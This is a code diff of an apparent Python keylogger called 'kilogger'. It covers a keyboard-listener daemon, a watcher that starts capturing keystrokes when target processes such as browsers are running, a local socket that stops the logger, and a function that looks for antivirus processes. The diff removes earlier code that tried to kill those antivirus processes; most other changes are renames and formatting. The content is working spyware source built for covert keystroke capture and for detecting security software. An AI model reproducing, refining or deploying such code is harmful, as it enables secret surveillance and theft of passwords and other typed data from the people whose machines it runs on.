@@ -82,6 +82,7 @@ class AutoDestroyHandler(RotatingFileHandler):
     Leverages RotatingFileHandler functionality
     to stop the logger once maxBytes is reached
     """
+
     def doRollover(self):
         requests.get('http://127.0.0.1:65432/terminate', timeout=5)
 
@@ -108,11 +109,11 @@ class KeyboardListener(Thread):
         self.__logger = logging.getLogger('kilogger')
 
     def run(self):
-        """Run KLogger daemon"""
+        """Run KeyboardListener daemon"""
         self.__k_listener.start()
 
     def stop(self):
-        """Stop KLogger daemon"""
+        """Stop KeyboardListener daemon"""
         self.__k_listener.stop()
 
     def _action(self, key):
@@ -123,6 +124,7 @@ class KeyboardListener(Thread):
 
 class BaseManager(KeyboardManager):
     """Interface to start and stop KeyboardListener threads"""
+
     def __init__(self):
         self.__current: KeyboardListener | None = None
 
@@ -143,28 +145,31 @@ class WatchingManager(Thread, KeyboardManager):
     """
     Watches specified "--targets" processes and runs a KeyboardListener
     thread when one of the targets is executed.
+    It works as wrapper for BaseManager to extend his functionality.
     """
     RUNNING = 'Running'
     NOT_RUNNING = 'Not Running'
     STOP = '/terminate'
 
     STATUS = [
-        (NOT_RUNNING, RUNNING),     # turned on
-        (RUNNING, RUNNING),         # already on
-        (RUNNING, NOT_RUNNING),     # turned off
+        (NOT_RUNNING, RUNNING),  # turned on
+        (RUNNING, RUNNING),  # already on
+        (RUNNING, NOT_RUNNING),  # turned off
         (NOT_RUNNING, NOT_RUNNING)  # already off
     ]
 
-    def __init__(self, targets: list, factory: BaseManager, *args,
-                 sleep: int = 10, **kwargs):
+    def __init__(self, targets: list, manager: BaseManager, *args,
+                 clock: int = 10, **kwargs):
         super().__init__(*args, **kwargs)
 
         self.__targets = {t: WatchingManager.STATUS[3] for t in targets}
-        self.__logger_factory = factory
-        self.__logger_status = WatchingManager.NOT_RUNNING
+        self.__manager = manager
+        self.__clock = clock
+
         self.__logger = logging.getLogger('kilogger')
-        self.__sleep = sleep
+        self.__logger_status = WatchingManager.NOT_RUNNING
         self.__stop_event = Event()
+
         self.daemon = True
 
     def run(self):
@@ -188,20 +193,19 @@ class WatchingManager(Thread, KeyboardManager):
                 if (status[1] == WatchingManager.RUNNING and
                         self.__logger_status == WatchingManager.NOT_RUNNING):
                     self.__logger_status = WatchingManager.RUNNING
-                    self.__logger_factory.run()
+                    self.__manager.run()
 
-            # self.__logger.info(f'[i] Active targets: {active_count}')
             if (active_count == 0 and
                     self.__logger_status == WatchingManager.RUNNING):
-                self.__logger_factory.stop()
+                self.__manager.stop()
 
             # wait to re-execute check
-            time.sleep(self.__sleep)
+            time.sleep(self.__clock)
 
     def stop(self):
         """Called when the termination signal is sent to SocketListener."""
         if self.__logger_status == WatchingManager.RUNNING:
-            self.__logger_factory.stop()
+            self.__manager.stop()
         self.__stop_event.set()
 
     def find_process(self):
@@ -270,7 +274,7 @@ class SocketListener:
 
 def friendly_check():
     """
-    TODO: improve or remove
+    Checks if the os has AV running.
     """
     # some 'friends' that must be checked
     target_friends = ['msmpeng.exe', 'avgnt.exe', 'avp.exe',
@@ -281,21 +285,13 @@ def friendly_check():
                       ]
 
     target_found = False
-    target_killed = False
     for proc in psutil.process_iter(['name']):
         if proc.name().lower() in target_friends:
             target_found = True
-            try:
-                # terminate always founds a friend but is
-                # never able to say goodbye to him :(
-                proc.terminate()
-                target_killed = True
-            except psutil.AccessDenied:
-                target_killed = False
-    return target_killed or target_found
+    return target_found
 
 
-def main(argv = None):
+def main(argv=None):
     """
     Main function of the kilogger program.
     """
@@ -325,7 +321,7 @@ def main(argv = None):
         action=StringToList,
         default=[],
         help='Name of target processes (ex. "chrome.exe, firefox.exe"); '
-        'note: process names should be separated by ", ".'
+             'note: process names should be separated by ", ".'
     )
 
     parser.add_argument(
@@ -351,8 +347,8 @@ def main(argv = None):
         if args.targets:
             proc_listener = WatchingManager(
                 args.targets,
-                sleep=DEFAULT_TIMEOUT,
-                factory=logger_factory
+                clock=DEFAULT_TIMEOUT,
+                manager=logger_factory
             )
             proc_listener.start()
             SocketListener(proc_listener)
